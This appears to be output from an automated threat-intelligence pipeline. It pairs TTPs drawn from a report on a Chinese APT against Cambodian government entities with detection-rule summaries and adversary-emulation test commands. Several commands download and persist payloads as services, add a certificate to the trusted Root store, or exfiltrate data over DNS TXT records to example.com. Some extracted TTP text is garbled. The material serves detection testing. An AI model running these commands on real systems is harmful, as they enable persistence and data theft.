extracted_ttps.description: The attackers used malicious URLs to gain initial access to the target system
The actor is attempting to avoid detection by blending into regular Cambodian business hours which are UTC +07:00, suggesting potential data exfiltration over alternative protocols
Chinese APT actors targeted Cambodian government entities by exploiting public-facing applications, likely through malicious infrastructure masquerading as cloud backup services
The threat actor is using virtual private servers (VPS) and cloud hosting providers to host their command and control infrastructure.
The threat actor is using social engineering tactics to gain initial access to the target network, likely through phishing emails or other means.
The actor observed a significant change in activity that suggests the actor is based in China and working regular business hours in China
The attacker used a malicious SSL certificate to establish a connection with the target server, potentially using a commonly used port.
The attackers used DNS security to communicate with the command and control server
Chinese APT actors may have used application window discovery techniques to gather information about the targeted Cambodian government entities
The threat actor is using the Cowrie honeypot to deceive network defenders and researchers, and to discover application windows.
The threat actor is discovering system owners and users, likely to identify potential targets for further exploitation.
The threat actor is exfiltrating sensitive data over alternative protocols, such as HTTP or HTTPS.
Chinese APT actors may have used phishing techniques to gain initial access to the targeted Cambodian government entities

extracted_ttps.technique_name: Exfiltration Over Command and Control Channel
extracted_ttps.description: The threat actor is exfiltrating sensitive data from the target network over a command and control channel.
The threat actor is using user execution to run malicious code or commands on the target system.
The attacker may have used drive-by compromise to infect the target system, potentially using a malicious SSL certificate.
The attacker acquired infrastructure, including six target-facing IP addresses, to support their malicious activities.
The attackers may have used phishing to gain initial access to the target system
Detected Create or Modify System Process activity via NLP pattern matching
Detected Application Layer Protocol activity via NLP pattern matching

rules.title: Exploit Public-Facing Application via Malicious URLs
rules.description: Detects exploitation of public-facing applications through malicious URLs
falsepositives: Administrators using command line tools to access legitimate URLs
Legitimate system processes accessing URLs for updates or other purposes

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Exfiltration Over Alternative Protocol
rules.description: Detects potential data exfiltration over alternative protocols by analyzing process creation and network connection events during Cambodian business hours (UTC+7)
falsepositives: Legitimate administrative activities
Software updates

rules.title: Virtual Private Server Command and Control Detection
rules.description: Detects potential command and control activity using virtual private servers (VPS) and cloud hosting providers
falsepositives: Legitimate connections to cloud services
Connections to VPS providers for legitimate purposes

rules.title: Detection of Phishing via Office Process Spawning Command Shells
rules.description: Identify potential phishing attacks by detecting Office processes spawning command shells
falsepositives: Legitimate administrative tasks where Office applications launch command shells
Software installation or update processes

rules.title: System Time Discovery
rules.description: Detects potential system time discovery by an adversary working Chinese business hours in the UTC+8 time zone

detection.condition: selection and (Hour = 1 or Hour = 2 or Hour = 3 or Hour = 4 or Hour = 5 or Hour = 6 or Hour = 7 or Hour = 8 or Hour = 9 or Hour = 10 or Hour = 11 or Hour = 12 or Hour = 13 or Hour = 14 or Hour = 15 or Hour = 16 or Hour = 17)

falsepositives: Legitimate system administration tasks
Time synchronization with a network time protocol (NTP) server

rules.title: Commonly Used Port Detection
rules.description: Detects potential command and control communication using a commonly used port and malicious SSL certificate
falsepositives: Legitimate SSL connections to known services
False positives may occur if the IP address is used by a legitimate service

rules.title: DNS Tunneling via TXT Records
rules.description: Detects DNS tunneling via TXT records to known command and control servers
falsepositives: Legitimate DNS queries to TXT records
DNS queries from known DNS tunneling tools used for legitimate purposes

rules.title: System Owner/User Discovery
rules.description: Detects system owner and user discovery techniques
falsepositives: Legitimate system administration tasks
Network scanning tools

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Exfiltration Over Command and Control Channel
rules.description: Detects potential exfiltration of sensitive data over a command and control channel
falsepositives: Legitimate use of encryption for secure data transfer
Network connections to known good IP addresses
rules.technique_name: Exfiltration Over Command and Control Channel

rules.title: Detection: User Execution
rules.description: The threat actor is using user execution to run malicious code or commands on the target system.
falsepositives: Legitimate administrative activity

rules.title: Detection: Drive-by Compromise
rules.description: The attacker may have used drive-by compromise to infect the target system, potentially using a malicious SSL certificate.
falsepositives: Legitimate administrative activity

rules.title: Acquire Infrastructure Detection
rules.description: Detects potential acquire infrastructure technique by analyzing network connections
falsepositives: Legitimate network connections to the specified IP address
Network connections from trusted sources

rules.title: Create or Modify System Process Detection
rules.description: Detects Create or Modify System Process activity via process creation events
falsepositives: Legitimate system processes created or modified by system administrators
PowerShell or cmd.exe processes created by legitimate system tasks

attacks.description: Downloads a file from a URL using certutil
attacks.expected_behavior: File is downloaded to %TEMP%\test.txt using legitimate certutil utility

attacks.description: Downloads and executes batch file via bitsadmin
attacks.expected_behavior: Downloads test.bat and executes it, simulating payload deployment

attacks.command: certutil -urlcache -split -f http://example.com/test.exe %TEMP%\test.exe && sc create MaliciousService binPath= "%TEMP%\test.exe" start= auto && sc start MaliciousService
attacks.description: Downloads executable and creates/start a service to run it
attacks.expected_behavior: Creates persistent service executing downloaded payload (requires admin)

attacks.description: Basic command to simulate a malicious URL request using curl.
attacks.expected_behavior: The command executes a GET request to the specified URL without causing system harm.

attacks.description: Intermediate command to simulate downloading and executing a malicious script.
attacks.expected_behavior: The command downloads a file and then attempts to execute it as a bash script, simulating an exploit's behavior without actual malicious payload.

attacks.description: Advanced command to simulate a direct exploit by piping a malicious URL's output to bash for execution.
attacks.expected_behavior: The command pipes the output of the curl command directly to bash for execution, simulating a sophisticated exploit technique.

attacks.description: Listen on port 8080 and save incoming data to a file, simulating data exfiltration.
attacks.expected_behavior: The command listens on port 8080 and saves any incoming data to exfiltrated_data.txt, demonstrating how an attacker might receive exfiltrated data.

attacks.description: Send the contents of /etc/passwd to example.com over port 8080, simulating exfiltration of sensitive data.
attacks.expected_behavior: The command sends the contents of /etc/passwd to example.com over port 8080, demonstrating how an attacker might exfiltrate sensitive data using an alternative protocol.

attacks.description: Listen on port 8080 and send 'Test data' when a connection is established, simulating data exfiltration over an alternative protocol.
attacks.expected_behavior: The command listens on port 8080 and sends 'Test data' when a connection is established, demonstrating a basic form of data exfiltration over an alternative protocol.

attacks.description: Downloads file from VPS using certutil
attacks.expected_behavior: Creates a temporary file from VPS-hosted content. Network connection to testvps.example.com will be visible.

attacks.description: Fetches and executes PowerShell script from VPS
attacks.expected_behavior: Downloads and executes benign script from VPS. HTTPS connection to testvps.example.com will be logged.

attacks.command: cmd.exe /c "echo nslookup testvps.example.com > %TEMP%\c2script.bat & echo ping -n 60 127.0.0.1 >> %TEMP%\c2script.bat & sc create C2Service binPath= \"%TEMP%\c2script.bat\" start= auto"
attacks.description: Creates persistent service for periodic VPS communication
attacks.expected_behavior: Creates auto-start service that periodically resolves VPS domain. Service creation event and DNS queries will be observable.

attacks.description: Listen on port 8080 and save received data to a file, simulating a command and control server receiving data.
attacks.expected_behavior: The command sets up a listener on port 8080, and any data sent to this port will be saved to received_data.txt.

attacks.description: Download a file from a remote server, simulating the download of a malicious payload.
attacks.expected_behavior: The command downloads a file from the specified URL and saves it as payload.txt. For testing, use a benign URL.

attacks.description: Send data from a file to a remote server, simulating sending commands or data to a command and control server.
attacks.expected_behavior: The command sends the contents of send_data.txt to the specified server and port. Use a test server or a benign string for safety.

attacks.description: Basic: Download file using certutil (simulates payload retrieval)
attacks.expected_behavior: Downloads example.com/setup.txt to %TEMP%. Certutil output shows cache operations.

attacks.description: Intermediate: Create startup shortcut to URL (simulates persistence/auto-launch)
attacks.expected_behavior: Creates Update.lnk in Startup folder. On login, opens URL in default browser.

attacks.description: Advanced: Download and open file (simulates payload execution)
attacks.expected_behavior: Downloads notes.txt to TEMP and opens in Notepad. Mimics post-download execution flow.

attacks.description: Downloads a script from a URL and executes it, simulating a phishing attack that leads to malicious script execution.
attacks.expected_behavior: The script will be downloaded and executed, potentially creating a backdoor or exploiting a vulnerability.

attacks.description: Downloads a malicious payload, saves it to a temporary file, makes it executable, and then runs it, simulating a phishing attack leading to malware execution.
attacks.expected_behavior: The payload will be downloaded, saved, made executable, and then executed, potentially leading to malicious activity.

attacks.description: Creates a benign script, makes it executable, and then runs it, simulating the creation and execution of a malicious script in a phishing context.
attacks.expected_behavior: The script will be created, made executable, and then executed, demonstrating how a phishing attack could lead to script execution.

attacks.description: Query the status of the Windows Time Service to discover system time settings.
attacks.expected_behavior: The command will output the current status of the Windows Time Service, including information about the system's time source and last synchronization time.

attacks.description: Use PowerShell to get the current date and time, demonstrating how an attacker might use scripting to discover system time information.
attacks.expected_behavior: The command will output the current date and time in a format that can be easily parsed by an attacker.

attacks.description: Use the systeminfo command to display system information and filter the output to show time-related details.
attacks.expected_behavior: The command will display system information related to the time zone and current system time.

attacks.description: Displays the current date and time
attacks.expected_behavior: Prints the current system date and time to the console

attacks.description: Displays or sets the system clock and timezone
attacks.expected_behavior: Prints the current system clock and timezone settings to the console

attacks.description: Lists all available timezones
attacks.expected_behavior: Lists all available timezones to the console, which can help in identifying the system's timezone

attacks.command: netsh interface portproxy add v4tov4 listenport=80 connectaddress=127.0.0.1 connectport=8080
attacks.description: This command uses 'netsh' to set up a port forwarding rule, redirecting traffic from port 80 to port 8080 on localhost, simulating the use of a commonly used port for command and control.
attacks.expected_behavior: Establishes a port forwarding rule without requiring external network access, demonstrating the technique's applicability in a controlled environment.

attacks.description: Tests the connectivity to the forwarded port, ensuring the setup is correct and functional, mimicking a client connecting to a command and control server on a commonly used port.
attacks.expected_behavior: Successfully connects to the port, demonstrating the technique's feasibility in a benign scenario.

attacks.description: Uses PowerShell to establish a TCP connection to the commonly used port, simulating a client's connection attempt to a command and control server, ensuring the technique can be demonstrated with PowerShell.
attacks.expected_behavior: Establishes and then closes a connection to the specified port, demonstrating the use of PowerShell for this technique without causing harm.

attacks.description: Listen on port 443 and echo a message when a connection is established
attacks.expected_behavior: The command will listen on port 443 and echo 'Connected to port 443' when a connection is established

attacks.description: Establish a connection with a target server on port 443 using OpenSSL
attacks.expected_behavior: The command will establish a connection with the target server on port 443

attacks.description: Establish a connection with a target server on port 80 using netcat
attacks.expected_behavior: The command will establish a connection with the target server on port 80

attacks.description: Basic DNS query to simulate C2 communication
attacks.expected_behavior: The command queries the DNS server at 8.8.8.8 for the IP address of example.com, simulating a basic form of command and control communication over the application layer.

attacks.description: Intermediate PowerShell command to establish a TCP connection to simulate C2 communication
attacks.expected_behavior: This command attempts to establish a TCP connection to example.com on port 80, simulating a more advanced form of command and control communication. It then closes the connection.

attacks.description: Advanced command using certutil to download and display a file, simulating a C2 communication scenario
attacks.expected_behavior: This command uses certutil to download a file from example.com, saves it to the temp directory, and then displays the contents of the file. This simulates downloading and executing commands or files from a C2 server.

attacks.description: Basic DNS query to simulate command and control communication
attacks.expected_behavior: The command queries the DNS server for the IP address of example.com, which could be used as a basic form of covert communication.

attacks.command: echo 'Hello World' | xxd -p | nslookup -type=txt $(echo 'Hello World' | xxd -p).example.com
attacks.description: Intermediate command using DNS to exfiltrate data encoded in a TXT record
attacks.expected_behavior: This command encodes 'Hello World' to hexadecimal, then uses nslookup to query a TXT record that could potentially be used for data exfiltration.

attacks.command: while true; do dig +short example.com; sleep 5; done
attacks.description: Advanced command simulating periodic DNS queries for persistent command and control communication
attacks.expected_behavior: This command continuously queries the DNS server for the IP address of example.com every 5 seconds, simulating a persistent command and control channel.

attacks.description: Displays detailed information about the current user, including username, SID, and group memberships.
attacks.expected_behavior: Outputs the current user's security identifiers, privileges, and group memberships.

attacks.description: Lists all local user accounts on the system.
attacks.expected_behavior: Displays a list of local user accounts including built-in system accounts.

attacks.description: Lists members of the local Administrators group to identify privileged accounts.
attacks.expected_behavior: Shows user accounts with administrative privileges on the local system.

attacks.description: Print user and group information for the specified user
attacks.expected_behavior: Display user and group information

attacks.description: Show who is logged on
attacks.expected_behavior: Display logged-in users

attacks.description: Get entries from the password database
attacks.expected_behavior: Display database entries

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Encodes test file with certutil and exfiltrates via HTTP POST using PowerShell
attacks.expected_behavior: Base64 encodes test.txt file and sends contents via HTTP POST to example.com. Temporary encoded file is deleted afterward.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Uses BITS to upload file to remote server
attacks.expected_behavior: Creates BITS transfer job to upload test.txt to example.com using background transfer service

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Compresses test file and exfiltrates via HTTP POST with cleanup
attacks.expected_behavior: Creates ZIP archive of test file, sends via HTTP POST, then deletes temporary archive. Uses -Force for file operations and SilentlyContinue for cleanup errors.

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Compress and encode sensitive data for exfiltration
attacks.expected_behavior: Creates a compressed and encoded file in /tmp that could be exfiltrated

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Exfiltrate sensitive data over a command and control channel using netcat
attacks.expected_behavior: Sends the contents of /etc/hosts to the specified server and port

attacks.technique_name: Exfiltration Over Command and Control Channel
attacks.description: Exfiltrate data using curl, assuming data is in a JSON file
attacks.expected_behavior: Posts the contents of /tmp/data.json to the specified URL

attacks.description: Basic command that writes a test string to a file in the temp directory
attacks.expected_behavior: A file named test.txt will be created in the temp directory with the contents "Hello World"

attacks.description: Intermediate command that displays a message box with a test string
attacks.expected_behavior: A message box will be displayed with the contents "Hello World"

attacks.description: Advanced command that downloads a file from a URL and executes it
attacks.expected_behavior: A file named test.txt will be downloaded from the specified URL and executed

attacks.description: Basic command that runs a script to create a file in the /tmp directory
attacks.expected_behavior: Creates a file named test.txt in the /tmp directory with the contents 'Hello World'

attacks.description: Intermediate command that uses Python to create a file in the /tmp directory
attacks.expected_behavior: Creates a file named test2.txt in the /tmp directory

attacks.description: Advanced command that creates a file, changes its permissions, and simulates a more sophisticated attack
attacks.expected_behavior: Creates a file named test3.txt in the /tmp directory with the contents 'Hello World' and changes its permissions to 755

attacks.description: Basic download of a file using certutil (simulated malicious payload)
attacks.expected_behavior: File test.txt is downloaded from example.com to the user's TEMP directory. Certutil logs may show URL cache activity.

attacks.command: bitsadmin /transfer job /download /priority normal http://example.com/fakecert.cer %TEMP%\fakecert.cer && certutil -addstore Root %TEMP%\fakecert.cer
attacks.description: Intermediate: Download certificate with BITSAdmin and add to trusted Root store
attacks.expected_behavior: Certificate is downloaded via BITS and added to Trusted Root Certification Authorities. Requires elevation for certutil -addstore.

attacks.description: Advanced: PowerShell download and execution of a file
attacks.expected_behavior: test.exe is downloaded and executed from TEMP directory. Process creation events for test.exe will be visible.

attacks.description: Generate a self-signed SSL certificate to mimic a malicious certificate used in drive-by compromise.
attacks.expected_behavior: A self-signed SSL certificate is generated in the current directory.

attacks.description: Simulate a drive-by download by fetching a file from a local web server and making it executable.
attacks.expected_behavior: A file named 'malicious_file' is downloaded to /tmp, made executable, but not executed due to safety considerations.

attacks.description: Advanced simulation of a drive-by compromise using curl to download a malicious payload over HTTPS and then executing it.
attacks.expected_behavior: A payload is downloaded from a local HTTPS server and executed. This command poses a higher safety risk due to the execution of potentially malicious content.

attacks.command: cmd.exe /c "echo 10.0.0.1 > %TEMP%\ips.txt && echo 10.0.0.2 >> %TEMP%\ips.txt && echo 10.0.0.3 >> %TEMP%\ips.txt && echo 10.0.0.4 >> %TEMP%\ips.txt && echo 10.0.0.5 >> %TEMP%\ips.txt && echo 10.0.0.6 >> %TEMP%\ips.txt"
attacks.description: Creates a text file with six static IP addresses in TEMP directory
attacks.expected_behavior: Creates %TEMP%\ips.txt containing six test IP addresses simulating acquired infrastructure

attacks.description: Generates six random IP addresses and saves to TEMP using PowerShell
attacks.expected_behavior: Creates $env:TEMP\ips_ps.txt with dynamically generated IP addresses using benign ranges

attacks.description: Adds a new IP address to network interface (simulate infrastructure configuration)
attacks.expected_behavior: Adds secondary IP 172.16.1.100 to Ethernet0 interface if exists; requires admin rights

attacks.command: sudo ip addr add 192.168.1.100/24 dev eth0
attacks.description: Adds a new IP address to the eth0 network interface, simulating the acquisition of a new IP address for infrastructure.
attacks.expected_behavior: The system will add a new IP address to the specified network interface, allowing it to communicate over the network with the new IP address.

attacks.description: Acquires an IP address for the eth0 interface from a DHCP server, simulating dynamic infrastructure allocation.
attacks.expected_behavior: The system will request and receive an IP address from a DHCP server, configuring the eth0 interface for network communication.

attacks.command: sudo ip link set eth0 up
attacks.description: Brings the eth0 network interface up, ensuring it is active and can be used for network communication, simulating the activation of acquired infrastructure.
attacks.expected_behavior: The eth0 network interface will be activated, allowing the system to send and receive network traffic over this interface.

attacks.command: sc.exe create TestService binPath= "%TEMP%\test.exe" start= auto
attacks.description: Creates a new auto-start service pointing to a benign TEMP file
attacks.expected_behavior: Service 'TestService' created but remains inactive since %TEMP%\test.exe doesn't exist

attacks.description: Creates system startup scheduled task with benign payload
attacks.expected_behavior: Scheduled task 'TestTask' created but won't execute actual payload

attacks.description: Modifies HKLM Run registry key to execute benign VBS on login
attacks.expected_behavior: Registry entry added to auto-start non-existent VBS script from TEMP

attacks.description: Start the nginx service, demonstrating the creation of a system process.
attacks.expected_behavior: The nginx service will start, creating a new system process.

attacks.description: Restart the sshd service, demonstrating the modification of an existing system process.
attacks.expected_behavior: The sshd service will restart, modifying the existing system process.

attacks.description: Open the cron table for editing, allowing for the creation or modification of scheduled system processes.
attacks.expected_behavior: The cron table will be opened for editing, allowing for the creation or modification of scheduled system processes.
